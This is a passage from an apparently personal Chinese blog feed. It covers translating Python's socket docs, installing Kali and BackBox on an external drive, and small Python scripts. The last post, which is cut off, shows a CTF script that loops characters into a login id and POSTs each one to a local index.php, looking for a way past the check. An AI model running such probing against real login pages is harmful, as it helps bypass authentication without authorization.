class="preprocessor">#PS:书上说family参数指定的是通信类型，我认为其实就是指定网络层协议，默认值AF_INET表示的是IPv4协议．．．type指定的是协议家族，我认为是指定传输层协议，数据流表示的是TCP协议，数据报表示的是UDP协议．．．</span></span><br><span class="line">	｜A socket <span class="built_in">object</span> represents one endpoint <span class="keyword">of</span> a network connection.</span><br><span class="line">	｜<span class="preprocessor">#一个socket对象代表一个网络连接的端点</span></span><br><span class="line">	｜Methods <span class="keyword">of</span> socket objects (keyword arguments <span class="keyword">not</span> allowed):</span><br><span class="line">	｜<span class="preprocessor">#下面为的socket对象的方法（关键词参数不被允许使用）</span></span><br><span class="line">	｜accept() -- accept a connection, returning <span class="keyword">new</span> socket <span class="keyword">and</span> client address <span class="preprocessor">#　等待接受一个新的连接，返回一个新的socket对象和客户端地址　都是在服务端使用该方法．</span></span><br><span class="line">　	｜bind(addr) -- bind the socket <span class="keyword">to</span> a local address　<span class="preprocessor">#绑定一个本地地址到socket，一般是在服务端使用，（也可以绑定端口，此为可选项）</span></span><br><span class="line">	｜close() -- close the socket　<span class="preprocessor">#关闭socket</span></span><br><span class="line">	｜connect(addr) -- connect the socket <span class="keyword">to</span> a remote address <span class="preprocessor">#socket连接到远程地址</span></span><br><span class="line">	｜connect_ex(addr) -- connect, <span class="keyword">return</span> an <span class="keyword">error</span> code instead <span class="keyword">of</span> an exception</span><br><span class="line">	｜dup() -- <span class="keyword">return</span> a <span class="keyword">new</span> socket <span class="built_in">object</span> identical <span class="keyword">to</span> the current one [*]</span><br><span class="line">	｜fileno() -- <span class="keyword">return</span> underlying file descriptor </span><br><span class="line">	｜getpeername() -- <span class="keyword">return</span> remote address [*]　<span class="preprocessor">#返回一个远程地址</span></span><br><span class="line">	｜getsockname() -- <span class="keyword">return</span> local address　<span class="preprocessor">#返回一个本地地址</span></span><br><span class="line">	｜getsockopt(level, optname[, buflen]) -- <span class="keyword">get</span> socket options</span><br><span class="line">	｜gettimeout() -- <span class="keyword">return</span> timeout <span class="keyword">or</span> None</span><br><span class="line">	｜listen(n) -- start listening <span class="keyword">for</span> incoming connections　<span class="preprocessor">#开始监听，用于服务器，传入一个参数n，指定了最大连接数</span></span><br><span class="line">	｜makefile([mode, [bufsize]]) -- <span class="keyword">return</span> a file <span class="built_in">object</span> <span class="keyword">for</span> the socket [*]　<span class="preprocessor">#返回一个文件对象</span></span><br><span class="line">	｜recv(buflen[, flags]) -- receive data　<span class="preprocessor">#接收数据</span></span><br><span class="line">	｜recv_into(buffer[, nbytes[, flags]]) -- receive datainto a buffer)</span><br><span class="line">	｜recvfrom(buflen[, flags]) -- receive data <span class="keyword">and</span> sender＇s address</span><br><span class="line">	｜recvfrom_into(buffer[, nbytes, [, flags])</span><br><span class="line">	｜		-- receive data <span class="keyword">and</span> sender＇s address (<span class="keyword">into</span> a buffer)</span><br><span class="line">	｜sendall(data[, flags]) -- send all data　<span class="preprocessor">#发送所以的数据</span></span><br><span class="line">	｜send(data[, flags]) -- send data, may <span class="keyword">not</span> send all <span class="keyword">of</span> it</span><br><span class="line">	｜sendto(data[, flags], addr) -- send data <span class="keyword">to</span> a given address</span><br><span class="line">	｜setblocking(<span class="number">0</span> | <span class="number">1</span>) -- <span class="keyword">set</span> <span class="keyword">or</span> clear the blocking I/O flag</span><br><span class="line">	｜setsockopt(level, optname, value) -- <span class="keyword">set</span> socket options</span><br><span class="line">	｜settimeout(None | float) -- <span class="keyword">set</span> <span class="keyword">or</span> clear the timeout</span><br><span class="line">	｜shutdown(how) -- shut down traffic <span class="keyword">in</span> one <span class="keyword">or</span> both directions</span><br><span class="line">	｜</span><br><span class="line">	｜	[*] <span class="keyword">not</span> available <span class="keyword">on</span> all platforms!　<span class="preprocessor">#出现[*]表示改方法不适用于所有平台</span></span><br><span class="line">	｜Methods defined here:</span><br><span class="line">	｜<span class="preprocessor">#下面是上面方法的定义</span></span><br><span class="line">	｜__init__(self, family=<span class="number">2</span>, type=<span class="number">1</span>, proto=<span class="number">0</span>, _sock=None)</span><br><span class="line">	｜accept(self)</span><br><span class="line">	｜		accept() -&gt; (socket <span class="built_in">object</span>, address info)</span><br><span class="line">	｜</span><br><span class="line">	｜		Wait <span class="keyword">for</span> an incoming connection.  <span class="keyword">Return</span> a <span class="keyword">new</span> socket representing the</span><br><span class="line">	｜		connection, <span class="keyword">and</span> the address <span class="keyword">of</span> the client.  <span class="keyword">For</span> IP sockets, the address</span><br><span class="line">	｜		info <span class="keyword">is</span> a pair (hostaddr, port).</span><br><span class="line">	｜  </span><br><span class="line">	｜bind(...)</span><br><span class="line">	｜		bind(address)</span><br><span class="line">	｜</span><br><span class="line">	｜		Bind the socket <span class="keyword">to</span> a local address.  <span class="keyword">For</span> IP sockets, the address <span class="keyword">is</span> a</span><br><span class="line">	｜		pair (host, port); the host must refer <span class="keyword">to</span> the local host. <span class="keyword">For</span> raw packet</span><br><span class="line">	｜		sockets the address <span class="keyword">is</span> a tuple (ifname, proto [,pkttype [,hatype]])</span><br><span class="line">	｜ </span><br><span class="line">	｜close(self, _closedsocket=&lt;<span class="keyword">class</span> <span class="comment">'socket._closedsocket'&gt;,_delegate_methods=('recv', 'recvfrom', 'recv_into', 'recvfrom_into', 'send', 'sendto'), setattr=<span class="xmlDocTag">&lt;built-in function setattr&gt;</span>)</span></span><br><span class="line">	｜		close()</span><br><span class="line">	｜		Close the socket.  It cannot be used after this <span class="keyword">call</span>.</span><br><span class="line">	｜connect(...)</span><br><span class="line">	｜		connect(address)</span><br><span class="line">	｜ </span><br><span class="line">	｜		Connect the socket <span class="keyword">to</span> a remote address.  <span class="keyword">For</span> IP sockets, the address</span><br><span class="line">	｜		<span class="keyword">is</span> a pair (host, port).</span><br><span class="line">	｜</span><br><span class="line">	｜connect_ex(...)</span><br><span class="line">	｜		connect_ex(address) -&gt; errno</span><br><span class="line">	｜</span><br><span class="line">	｜		This <span class="keyword">is</span> <span class="keyword">like</span> connect(address), but returns an <span class="keyword">error</span> code (the errno value)</span><br><span class="line">	｜		instead <span class="keyword">of</span> raising an exception <span class="keyword">when</span> an <span class="keyword">error</span> occurs.</span><br><span class="line">	｜</span><br><span class="line">	｜dup(self)</span><br><span class="line">	｜		dup() -&gt; socket <span class="built_in">object</span></span><br><span class="line">	｜</span><br><span class="line">	｜		<span class="keyword">Return</span> a <span class="keyword">new</span> socket <span class="built_in">object</span> connected <span class="keyword">to</span> the same system resource.</span><br><span class="line">	｜</span><br><span class="line">	｜fileno(...)</span><br><span class="line">	｜		fileno() -&gt; <span class="built_in">integer</span></span><br><span class="line">	｜		<span class="keyword">Return</span> the <span class="built_in">integer</span> file descriptor <span class="keyword">of</span> the socket.</span><br><span class="line">	｜</span><br><span class="line">	｜getpeername(...)</span><br><span class="line">	｜		getpeername() -&gt; address info</span><br><span class="line">	｜</span><br><span class="line">	｜		<span class="keyword">Return</span> the address <span class="keyword">of</span> the remote endpoint.  <span class="keyword">For</span> IP sockets, the address</span><br><span class="line">	｜		info <span class="keyword">is</span> a pair (hostaddr, port).</span><br><span class="line">	｜</span><br><span class="line">	｜getsockname(...)</span><br><span class="line">	｜		getsockname() -&gt; address info</span><br><span class="line">	｜ </span><br><span class="line">	｜		<span class="keyword">Return</span> the address <span class="keyword">of</span> the local endpoint.  <span class="keyword">For</span> IP sockets, the address</span><br><span class="line">	｜		info <span class="keyword">is</span> a pair (hostaddr, port).</span><br><span class="line">	｜</span><br><span class="line">	｜getsockopt(...)</span><br><span class="line">	｜		getsockopt(level, <span class="keyword">option</span>[, buffersize]) -&gt; value</span><br><span class="line">	｜		<span class="keyword">Get</span> a socket <span class="keyword">option</span>.  See the Unix manual <span class="keyword">for</span> level <span class="keyword">and</span> <span class="keyword">option</span>.</span><br><span class="line">	｜		<span class="keyword">If</span> a nonzero buffersize argument <span class="keyword">is</span> given, the <span class="keyword">return</span> value <span class="keyword">is</span> a</span><br><span class="line">	｜		<span class="built_in">string</span> <span class="keyword">of</span> that length; otherwise it <span class="keyword">is</span> an <span class="built_in">integer</span>.</span><br><span class="line">	｜</span><br><span class="line">	｜gettimeout(...)</span><br><span class="line">	｜		gettimeout() -&gt; timeout</span><br><span class="line">	｜ </span><br><span class="line"> 	｜		Returns the timeout <span class="keyword">in</span> seconds (float) associated <span class="keyword">with</span> socket </span><br><span class="line"> 	｜		operations. A timeout <span class="keyword">of</span> None indicates that timeouts <span class="keyword">on</span> socket </span><br><span class="line"> 	｜		operations are disabled.</span><br><span class="line">	｜</span><br><span class="line">	｜listen(...)</span><br><span class="line">	｜		listen(backlog)</span><br><span class="line">	｜     </span><br><span class="line"> 	｜		Enable a server <span class="keyword">to</span> accept connections.  The backlog argument must be at</span><br><span class="line"> 	｜		least <span class="number">0</span> (<span class="keyword">if</span> it <span class="keyword">is</span> lower, it <span class="keyword">is</span> <span class="keyword">set</span> <span class="keyword">to</span> <span class="number">0</span>); it specifies the number <span class="keyword">of</span></span><br><span class="line">	｜		unaccepted connections that the system will allow before refusing <span class="keyword">new</span></span><br><span class="line">	｜		connections.</span><br><span class="line">	｜</span><br><span class="line">	｜makefile(self, mode=<span class="comment">'r', bufsize=-1)</span></span><br><span class="line">	｜		makefile([mode[, bufsize]]) -&gt; file <span class="built_in">object</span></span><br><span class="line">	｜</span><br><span class="line">	｜		<span class="keyword">Return</span> a regular file <span class="built_in">object</span> corresponding <span class="keyword">to</span> the socket.  The mode</span><br><span class="line">	｜		<span class="keyword">and</span> bufsize arguments are <span class="keyword">as</span> <span class="keyword">for</span> the built-<span class="keyword">in</span> open() <span class="keyword">function</span>.</span><br><span class="line">	｜</span><br><span class="line">	｜sendall(...)</span><br><span class="line">	｜		sendall(data[, flags])</span><br><span class="line">	｜</span><br><span class="line">	｜		Send a data <span class="built_in">string</span> <span class="keyword">to</span> the socket.  <span class="keyword">For</span> the <span class="keyword">optional</span> flags</span><br><span class="line">	｜		argument, see the Unix manual.  This calls send() repeatedly</span><br><span class="line">	｜		<span class="keyword">until</span> all data <span class="keyword">is</span> sent.  <span class="keyword">If</span> an <span class="keyword">error</span> occurs, it＇s impossible</span><br><span class="line">	｜		<span class="keyword">to</span> tell how much data has been sent.</span><br><span class="line">	｜</span><br><span class="line">	｜setblocking(...)</span><br><span class="line">	｜		setblocking(flag)</span><br><span class="line">	｜</span><br><span class="line"> 	｜		<span class="keyword">Set</span> the socket <span class="keyword">to</span> blocking (flag <span class="keyword">is</span> <span class="literal">true</span>) <span class="keyword">or</span> non-blocking (<span class="literal">false</span>).</span><br><span class="line">	｜		setblocking(<span class="literal">True</span>) <span class="keyword">is</span> equivalent <span class="keyword">to</span> settimeout(None);</span><br><span class="line">	｜		setblocking(<span class="literal">False</span>) <span class="keyword">is</span> equivalent <span class="keyword">to</span> settimeout(<span class="number">0.0</span>).</span><br><span class="line">	｜</span><br><span class="line">	｜setsockopt(...)</span><br><span class="line">	｜		setsockopt(level, <span class="keyword">option</span>, value)</span><br><span class="line">	｜</span><br><span class="line">	｜		<span class="keyword">Set</span> a socket <span class="keyword">option</span>.  See the Unix manual <span class="keyword">for</span> level <span class="keyword">and</span> <span class="keyword">option</span>.</span><br><span class="line">	｜		The value argument can either be an <span class="built_in">integer</span> <span class="keyword">or</span> a <span class="built_in">string</span>.</span><br><span class="line">	｜</span><br><span class="line">	｜settimeout(...)</span><br><span class="line">	｜		settimeout(timeout)</span><br><span class="line">	｜</span><br><span class="line">	｜		<span class="keyword">Set</span> a timeout <span class="keyword">on</span> socket operations.  <span class="comment">'timeout' can be a float,</span></span><br><span class="line">	｜		giving <span class="keyword">in</span> seconds, <span class="keyword">or</span> None.  Setting a timeout <span class="keyword">of</span> None disables</span><br><span class="line">	｜		the timeout feature <span class="keyword">and</span> <span class="keyword">is</span> equivalent <span class="keyword">to</span> setblocking(<span class="number">1</span>).</span><br><span class="line">	｜		Setting a timeout <span class="keyword">of</span> zero <span class="keyword">is</span> the same <span class="keyword">as</span> setblocking(<span class="number">0</span>).</span><br><span class="line">	｜</span><br><span class="line">	｜shutdown(...)</span><br><span class="line">	｜		shutdown(flag)</span><br><span class="line">	｜</span><br><span class="line">	｜		Shut down the reading side <span class="keyword">of</span> the socket (flag == SHUT_RD), the writing side</span><br><span class="line">	｜		<span class="keyword">of</span> the socket (flag == SHUT_WR), <span class="keyword">or</span> both ends (flag == SHUT_RDWR).</span><br><span class="line">	｜－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</span><br><span class="line">	｜Data descriptors defined here:</span><br><span class="line">	｜</span><br><span class="line">	｜__weakref__</span><br><span class="line">	｜list <span class="keyword">of</span> weak references <span class="keyword">to</span> the <span class="built_in">object</span> (<span class="keyword">if</span> defined)</span><br><span class="line">	｜</span><br><span class="line">	｜family</span><br><span class="line">	｜the socket family</span><br><span class="line">	｜</span><br><span class="line">	｜proto</span><br><span class="line">	｜the socket protocol</span><br><span class="line">	｜</span><br><span class="line">	｜recv</span><br><span class="line">	｜</span><br><span class="line">	｜recv_into</span><br><span class="line">	｜</span><br><span class="line">	｜recvfrom</span><br><span class="line">	｜</span><br><span class="line">	｜recvfrom_into</span><br><span class="line">	｜</span><br><span class="line">	｜send</span><br><span class="line">	｜</span><br><span class="line">	｜sendto</span><br><span class="line">	｜</span><br><span class="line">	｜type</span><br><span class="line">	｜the socket type</span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<p>时常翻译些python英文文档，，一方面学习python，一方面加强自己英语水平．．．<br>]]>
    
    </summary>
    
      <category term="Python" scheme="http://lazysheep.cc/tags/Python/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[在移动硬盘中装多系统]]></title>
    <link href="http://lazysheep.cc/2015/03/08/0x18/"/>
    <id>http://lazysheep.cc/2015/03/08/0x18/</id>
    <published>2015-03-08T07:10:34.000Z</published>
    <updated>2015-03-08T08:10:45.000Z</updated>
    <content type="html"><![CDATA[<p>最近搞到一个1TB的硬盘．．．然后就有了把系统装在移动硬盘上的想法．．．今天折腾了一天．．基本算是成功吧．．．<br><a id="more"></a></p>
<p>我装的是kali linux　和 backbox．．．相当与是装debian　和 ubuntu ．．．<br>我认为在硬盘上装系统，只会有两点困难．．<em>分区</em> and　<em>启动引导</em></p>
<p>由于这两种系统都属于做渗透测试的系统．．．就各分了100G挂载在 <code>/</code>..这个时候问题就来了,,我是先装的kali linux，分完区后，会提示修改的分区和格式化的分区，在格式化的分区底下除了我本身分出的100G主分区，，还多了电脑本地硬盘的swap分区，（我电脑本身是ubuntu和win7双系统），接着我就返回，在移动硬盘上又多分了一个4G的swap分区，然后下一步，要格式化的分区中就没有本地硬盘的分区了．．</p>
<p>后面装backbox就不一样了，分了一个100G主分区，4G swap分区．要格式化的分区却出现了4个：主分区,swap(本地硬盘上的),swap(前面装kali分的),swap(现在分的)．．．如果这次不分swap，，需格式化的分区仍然还有3个，也就是说，会格式化能读到的硬盘中的所有的swap分区，百度了 <em>＇linux格式化swap会怎么样＇</em>  ….没百度出来，只度到一个说是ubuntu格式化swap后不能休眠，，就更不敢格式化，，后来根据一个学长的建议在bios屏蔽本地硬盘，，可惜在华硕的bios界面没找到，度娘也不造，，</p>
<p>最后我在安装的分区界面发现了，可以把swap改为不使用此分区，．．然后．就没有然后了．．．在移动硬盘上分两个swap让我看着有点不爽，然后在度娘上看到了有人说debian可以不需要swap分区，，所以移动硬盘上就一个swap．．目前我对系统研究不是很深，，所以也不清楚现在是kali和backbox共用一个swap分区．还是只是backbox用这个swap分区．</p>
<p>PS:另外电脑本身的ubuntu系统是我平时要用的．．所以没有为科学献身的勇气去尝试格式化swap后到底会如何．．．有勇气的同志可以去试试．．．</p>
<p>接着是启动引导的问题，启动引导可以装到本地硬盘，也可以是移动硬盘上．．我选择是装在移动硬盘上，有两个原因，</p>
<ol>
<li>移动硬盘插到别的电脑上仍然可以启动，<br>2.　kali装到本地硬盘装失败了</li>
</ol>
<p>在安装启动引导这，，我认为backbox更好，kali需要你自己填写安装的地址，举的例子也都是 <code>/dev/sda</code>　本地硬盘的例子，后面还是去问度娘才知道移动硬盘的是 <code>/dev/sdb</code> (sdb开始我以为是属于常识性的，，移动硬盘都是sdb，，可是后面却看见有的移动硬盘却不是．．)<br>而backbox确实提供选项的，可以直接选择自己的移动硬盘(后面的标识的确是/dev/sdb)</p>
<p>＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝</p>
<p>写在最后的吐槽：<br><img src="/img/zj.gif" alt="/zj">backbox死坑的，刚下的4.1最新版，还要更新400MB+..浪费我1h<br>启动速度也没kali快．．．grub引导界面也丑爆了，，触摸板驱动也没有</p>
<p>其他的等待试用</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>最近搞到一个1TB的硬盘．．．然后就有了把系统装在移动硬盘上的想法．．．今天折腾了一天．．基本算是成功吧．．．<br>]]>
    
    </summary>
    
      <category term="系统" scheme="http://lazysheep.cc/tags/%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python练习 (一)]]></title>
    <link href="http://lazysheep.cc/2015/03/05/0x17/"/>
    <id>http://lazysheep.cc/2015/03/05/0x17/</id>
    <published>2015-03-05T14:07:24.000Z</published>
    <updated>2015-03-06T11:40:51.000Z</updated>
    <content type="html"><![CDATA[<p>题目来源于这：<br><a href="https://github.com/Yixiaohan/show-me-the-code" target="_blank" rel="external">https://github.com/Yixiaohan/show-me-the-code</a><br>不过我并不是按顺序做的．．．<br><a id="more"></a></p>
<h3 id="第_0004_题：任一个英文的纯文本文件，统计其中的单词出现的个数。">第 0004 题：任一个英文的纯文本文件，统计其中的单词出现的个数。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">gfile = sys.argv[<span class="number">1</span>]</span><br><span class="line">f = open(gfile)</span><br><span class="line">con = f.read()</span><br><span class="line">con = con.lower()</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">	a = con.count(x)</span><br><span class="line">	<span class="keyword">print</span> x,<span class="string">'Have'</span>,a</span><br><span class="line"><span class="comment">#开始题目看错了，，，以为是统计字母出现的个数．．所以有个这个版本．．</span></span><br></pre></td></tr></table></figure>
<p><em>下面的就是计算英文文本中单词的出现的次数了</em><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">gfile = sys.argv[<span class="number">1</span>]</span><br><span class="line">al = string.ascii_lowercase</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filt</span><span class="params">(li)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> li:</span><br><span class="line">		<span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> al:</span><br><span class="line">			li.replace(x,<span class="string">''</span>)</span><br><span class="line">	<span class="keyword">return</span> li</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aad</span><span class="params">(li)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> li <span class="keyword">not</span> <span class="keyword">in</span> neew:</span><br><span class="line">		neew.append(li)</span><br><span class="line">f = open(gfile)</span><br><span class="line">con = f.read()</span><br><span class="line">con = con.lower()</span><br><span class="line">con2 = con.split()</span><br><span class="line">neew = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> con2:</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> x.isalpha():</span><br><span class="line">		fft = filt(x)</span><br><span class="line">		<span class="keyword">if</span> fft.isalpha():</span><br><span class="line">			aad(fft)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		aad(x)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'This artical hava'</span>,neew.__len__(),<span class="string">'words.'</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> neew:</span><br><span class="line">	<span class="comment">#print '[%s] ==&gt; %s' %(x,con2.count(x))</span></span><br><span class="line"><span class="comment">#这个代码唯一让我不爽的是最后输出没法对齐．．．有强迫症的伤不起啊．．研究了半天还是没对齐．．．</span></span><br><span class="line">	amo = <span class="number">20</span> - x.__len__()</span><br><span class="line">	spa = [<span class="string">' '</span> <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>,amo)]</span><br><span class="line">	spa = <span class="string">''</span>.join(spa)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'[%s]%s======&gt; %s'</span> %(x,spa,con2.count(x))</span><br><span class="line"><span class="comment">#这样爽多了～～～效果为下第一张图</span></span><br><span class="line">	<span class="comment">#还有一种简单的方法，效果为下面第二张图</span></span><br><span class="line">	<span class="comment">#print '-' * 28</span></span><br><span class="line">	<span class="comment">#print '%-14s | %9s |' %(x,con2.count(x))</span></span><br></pre></td></tr></table></figure></p>
<p>附张效果图：<br>[   图１  ]<br><img src="/img/0004.png" alt="效果图1"><br>[  图２  ]<br><img src="/img/0014.png" alt="效果图2"></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>题目来源于这：<br><a href="https://github.com/Yixiaohan/show-me-the-code">https://github.com/Yixiaohan/show-me-the-code</a><br>不过我并不是按顺序做的．．．<br>]]>
    
    </summary>
    
      <category term="Python" scheme="http://lazysheep.cc/tags/Python/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[pyhon第二个脚本]]></title>
    <link href="http://lazysheep.cc/2015/02/28/0x16/"/>
    <id>http://lazysheep.cc/2015/02/28/0x16/</id>
    <published>2015-02-28T07:01:25.000Z</published>
    <updated>2015-02-28T07:16:10.000Z</updated>
    <content type="html"><![CDATA[<p><strong>今天又折腾了一个脚本…..</strong><br><a id="more"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> mysql.connector</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line">con = mysql.connector.connect(user=<span class="string">'xxx'</span>,password=<span class="string">'xxx'</span>,host=<span class="string">'127.0.0.1'</span>,database=<span class="string">'xxx'</span>)</span><br><span class="line">ccc = con.cursor()</span><br><span class="line">wb = xlwt.Workbook()</span><br><span class="line">ws = wb.add_sheet(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'1.txt'</span>)</span><br><span class="line">hehe = f.read().split()</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">		ws.write(<span class="number">0</span>,x,hehe[x].decode(<span class="string">'utf-8'</span>))     <span class="comment">#先从1.txt中导出表头信息..然后导入表头到excel中</span></span><br><span class="line"><span class="keyword">for</span> uu <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">283</span>):               </span><br><span class="line">	que = (<span class="string">'select id,xxx,xxx,xxx,xxx,xxx,xxx,"xxx" from wp_contestant where id like "%6" group by xxx order by xxx limit '</span>) + (str(uu)) + (<span class="string">',1'</span>)</span><br><span class="line"><span class="comment">#我这里这么写是因为数据库里表中有283个数据,,,用python的connector模块跑..跑了半天都没出来...我也不清楚为什么效率这么低..所以我换了一个方法..已经知道表中有283个数据..然后就一个一个跑....这回跑了8s左右就结束了..可是感觉速度还是太慢了...</span></span><br><span class="line">	ccc.execute(que)</span><br><span class="line">	aa = ccc.fetchall()</span><br><span class="line">	<span class="comment">#print aa[0]</span></span><br><span class="line">	gg = list(aa[<span class="number">0</span>])     <span class="comment">#aa是tuple,无法更改其中的数据....所以转换为list</span></span><br><span class="line">	gg[<span class="number">5</span>] = str(gg[<span class="number">5</span>])   <span class="comment">#第六个数据是data数据...</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">		ws.write(uu+<span class="number">1</span>,x,gg[x] <span class="keyword">or</span> gg[x].decode(<span class="string">'utf-8'</span>))    <span class="comment">#从数据库中读出的数据是u编码..不转换会报错</span></span><br><span class="line">wb.save(<span class="string">'123.xls'</span>)</span><br><span class="line">con.close()</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><strong>今天又折腾了一个脚本…..</strong><br>]]>
    
    </summary>
    
      <category term="Python" scheme="http://lazysheep.cc/tags/Python/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[第一个py脚本]]></title>
    <link href="http://lazysheep.cc/2015/02/26/0x15/"/>
    <id>http://lazysheep.cc/2015/02/26/0x15/</id>
    <published>2015-02-26T13:47:11.000Z</published>
    <updated>2015-03-13T05:00:18.000Z</updated>
    <content type="html"><![CDATA[<p><strong>写的第一个python脚本,,,,,</strong><br><a id="more"></a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">'http://localhost/index.php'</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">	<span class="comment">#idd = chr(x) + 'lightless'</span></span><br><span class="line">	<span class="comment">#data = &#123;'id':idd,'ps':'abc!10O0o'&#125;</span></span><br><span class="line">	url_data = <span class="string">"ps=abc!10O0o&amp;id=lightless"</span> + chr(x)</span><br><span class="line">	f = urllib.urlopen(url,url_data)</span><br><span class="line">	html = f.read()</span><br><span class="line">	size = sys.getsizeof(html)</span><br><span class="line">	<span class="keyword">if</span> size == <span class="number">475</span> <span class="keyword">or</span> size == <span class="number">494</span> :</span><br><span class="line">		<span class="comment">#print url_data</span></span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> html</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>这个脚本是用于week4最后一题的,,不过最后结果看来,,这题的题解只能是大小写…特殊字符没用.</p>
<p><em>后来突然想到用unicode编码看看能不能bypass，，所以更新了下脚本</em><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span 